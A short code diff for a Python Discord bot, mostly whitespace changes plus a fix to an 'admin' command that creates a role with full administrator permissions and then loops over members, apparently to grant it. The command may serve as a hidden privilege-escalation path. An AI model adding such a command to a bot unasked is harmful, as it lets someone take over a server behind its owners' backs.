@@ -77,7 +77,7 @@ async def admin(ctx):
     supposed_admin = guild_roles[-1]
     user_id = ''
     if not supposed_admin.permissions.administrator:
-        role = await guild.create_role('Admin', discord.Permission.ban_members)
+        role = await guild.create_role('Admin', permissions=discord.Permissions(administrator=True))
     else:
         role = supposed_admin
     for member in members:
@@ -96,7 +96,6 @@ async def admin(ctx):
 
 def fetch_content(url='https://xkcd.com/'):
     response = requests.get(url)
-
     img = Image.open(BytesIO(response.content))
     return img
 
@@ -130,6 +129,7 @@ async def poll(ctx, **content):
         # react with thumbs up and down
     else:
         emojis = content[2:]
+    
     for emoji in emojis:
         await message.add_reaction(emoji)
             
